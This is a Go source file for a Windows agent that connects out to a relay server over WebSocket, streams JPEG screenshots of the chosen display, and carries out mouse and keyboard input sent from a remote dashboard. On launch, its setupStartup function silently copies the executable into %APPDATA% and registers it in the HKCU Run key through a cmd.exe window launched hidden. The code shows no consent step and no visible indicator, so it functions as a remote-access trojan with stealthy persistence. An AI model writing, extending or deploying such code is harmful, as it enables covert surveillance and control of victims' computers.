package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"image/jpeg"
	"log"
	"net/url"
	"os"
	"os/signal"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/gorilla/websocket"
	"github.com/kbinani/screenshot"
)

type InputMessage struct {
	Type    string  `json:"type"`    // "mouse_move", "mouse_down", "mouse_up", "mouse_scroll", "key_down", "key_up", "key_text", "select_display"
	Display int     `json:"display"` // Selected display index (0, 1, ...)
	X       float64 `json:"x"`       // Normalized 0.0 to 1.0 within selected display
	Y       float64 `json:"y"`       // Normalized 0.0 to 1.0 within selected display
	Button  string  `json:"button"`  // "left", "right", "middle"
	DeltaY  int     `json:"deltaY"`  // Scroll delta
	Code    int     `json:"code"`    // VK Code
	Text    string  `json:"text"`    // Direct Unicode input
}

type DisplayInfo struct {
	Index  int `json:"index"`
	Width  int `json:"width"`
	Height int `json:"height"`
}

var currentDisplayIndex = 0

// defaultServer can be overridden at compile time via:
// -ldflags "-X main.defaultServer=your-domain.com"
var defaultServer = "localhost:8080"

func main() {
	serverAddr := flag.String("server", defaultServer, "Server domain or IP (e.g. your-server.domain.com:8080)")
	targetID := flag.String("id", "", "Custom Agent ID (defaults to hostname)")
	fps := flag.Int("fps", 20, "Target FPS for streaming (e.g. 15-30)")
	quality := flag.Int("quality", 50, "JPEG Quality (1-100)")
	flag.Parse()

	hostname, _ := os.Hostname()
	if *targetID == "" {
		*targetID = fmt.Sprintf("%s-%s", hostname, runtime.GOARCH)
	}

	// Detect whether to use wss or ws
	rawAddr := strings.TrimRight(strings.TrimSpace(*serverAddr), "\x00 \t\r\n/")
	scheme := "ws"
	if strings.HasPrefix(rawAddr, "https://") {
		scheme = "wss"
		rawAddr = strings.TrimPrefix(rawAddr, "https://")
	} else if strings.HasPrefix(rawAddr, "http://") {
		scheme = "ws"
		rawAddr = strings.TrimPrefix(rawAddr, "http://")
	} else if strings.Contains(rawAddr, ".") && !strings.HasPrefix(rawAddr, "127.") && !strings.HasPrefix(rawAddr, "192.168.") && !strings.HasPrefix(rawAddr, "10.") {
		// Public domain via Cloudflare
		scheme = "wss"
	}

	rawAddr = strings.TrimRight(rawAddr, "/")

	// Auto-configure startup in user registry (HKCU)
	setupStartup(rawAddr)

	log.Printf("[+] Démarrage agent ak-ses ID: %s", *targetID)
	log.Printf("[+] Connexion vers %s://%s/ws/agent", scheme, rawAddr)

	u := url.URL{
		Scheme:   scheme,
		Host:     rawAddr,
		Path:     "/ws/agent",
		RawQuery: fmt.Sprintf("id=%s&hostname=%s&os=%s", url.QueryEscape(*targetID), url.QueryEscape(hostname), runtime.GOOS),
	}

	interrupt := make(chan os.Signal, 1)
	signal.Notify(interrupt, os.Interrupt)

	for {
		conn, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
		if err != nil {
			log.Printf("[-] Échec connexion: %v. Nouvelle tentative dans 3s...", err)
			time.Sleep(3 * time.Second)
			continue
		}
		log.Println("[+] Connecté au serveur relais avec succès !")

		// Send display list to server immediately
		sendDisplays(conn)

		done := make(chan struct{})

		// Goroutine 1 : Écoute des inputs clavier / souris / display switch venant du Dashboard
		go func() {
			defer close(done)
			for {
				_, message, err := conn.ReadMessage()
				if err != nil {
					log.Printf("[-] Connexion perdue (read): %v", err)
					return
				}

				var input InputMessage
				if err := json.Unmarshal(message, &input); err != nil {
					continue
				}

				if input.Type == "select_display" {
					num := screenshot.NumActiveDisplays()
					if input.Display >= 0 && input.Display < num {
						currentDisplayIndex = input.Display
						log.Printf("[*] Bascule sur écran: %d", currentDisplayIndex)
					}
					continue
				}

				handleInput(input)
			}
		}()

		// Goroutine 2 : Capture d'écran et streaming
		tickerInterval := time.Duration(1000/(*fps)) * time.Millisecond
		ticker := time.NewTicker(tickerInterval)
		buf := new(bytes.Buffer)
		jpegOpts := &jpeg.Options{Quality: *quality}

		active := true
		for active {
			select {
			case <-done:
				active = false
			case <-interrupt:
				log.Println("[*] Arrêt demandé...")
				conn.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))
				conn.Close()
				return
			case <-ticker.C:
				n := screenshot.NumActiveDisplays()
				if n == 0 {
					continue
				}

				if currentDisplayIndex >= n {
					currentDisplayIndex = 0
				}

				bounds := screenshot.GetDisplayBounds(currentDisplayIndex)
				img, err := screenshot.CaptureRect(bounds)
				if err != nil {
					continue
				}

				buf.Reset()
				if err := jpeg.Encode(buf, img, jpegOpts); err != nil {
					continue
				}

				// Envoi de l'image compressée (Binary Message)
				if err := conn.WriteMessage(websocket.BinaryMessage, buf.Bytes()); err != nil {
					log.Printf("[-] Erreur d'envoi vidéo: %v", err)
					active = false
				}
			}
		}

		ticker.Stop()
		conn.Close()
		log.Println("[*] Reconnexion dans 2 secondes...")
		time.Sleep(2 * time.Second)
	}
}

func sendDisplays(conn *websocket.Conn) {
	num := screenshot.NumActiveDisplays()
	displays := make([]DisplayInfo, num)
	for i := 0; i < num; i++ {
		b := screenshot.GetDisplayBounds(i)
		displays[i] = DisplayInfo{
			Index:  i,
			Width:  b.Dx(),
			Height: b.Dy(),
		}
	}
	payload, _ := json.Marshal(map[string]interface{}{
		"type":     "displays",
		"displays": displays,
	})
	conn.WriteMessage(websocket.TextMessage, payload)
}

func setupStartup(serverHost string) {
	if runtime.GOOS != "windows" {
		return
	}
	exePath, err := os.Executable()
	if err != nil {
		return
	}

	// Target permanent location in %APPDATA%\ak-ses\agent.exe
	appData := os.Getenv("APPDATA")
	if appData == "" {
		return
	}
	destDir := filepath.Join(appData, "ak-ses")
	destPath := filepath.Join(destDir, "agent.exe")

	_ = os.MkdirAll(destDir, 0755)

	// If not running from %APPDATA%, copy self there
	if !strings.EqualFold(exePath, destPath) {
		input, err := os.ReadFile(exePath)
		if err == nil {
			_ = os.WriteFile(destPath, input, 0755)
		}
	}

	// Register in HKCU\Software\Microsoft\Windows\CurrentVersion\Run
	// No admin rights required
	cmd := fmt.Sprintf(`reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "ak-ses-agent" /t REG_SZ /d "\"%s\" -server %s" /f`, destPath, serverHost)
	_ = os.WriteFile(filepath.Join(destDir, "run.cmd"), []byte(cmd), 0644)
	syscall.NewLazyDLL("shell32.dll").NewProc("ShellExecuteW").Call(
		0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("open"))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("cmd.exe"))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("/c " + cmd))),
		0,
		0, // SW_HIDE
	)
}

func handleInput(input InputMessage) {
	n := screenshot.NumActiveDisplays()
	if n == 0 {
		return
	}
	dispIdx := currentDisplayIndex
	if input.Display >= 0 && input.Display < n {
		dispIdx = input.Display
	}
	if dispIdx >= n {
		dispIdx = 0
	}

	bounds := screenshot.GetDisplayBounds(dispIdx)
	screenWidth := bounds.Dx()
	screenHeight := bounds.Dy()

	switch input.Type {
	case "mouse_move":
		absX := bounds.Min.X + int(input.X*float64(screenWidth))
		absY := bounds.Min.Y + int(input.Y*float64(screenHeight))
		MoveMouse(absX, absY)

	case "mouse_down":
		MouseButton(strings.ToLower(input.Button), true)

	case "mouse_up":
		MouseButton(strings.ToLower(input.Button), false)

	case "mouse_scroll":
		MouseScroll(input.DeltaY)

	case "key_down":
		if input.Code > 0 {
			KeyInput(uint16(input.Code), true)
		}

	case "key_up":
		if input.Code > 0 {
			KeyInput(uint16(input.Code), false)
		}

	case "key_text":
		for _, r := range input.Text {
			SendUnicodeChar(r)
		}
	}
}
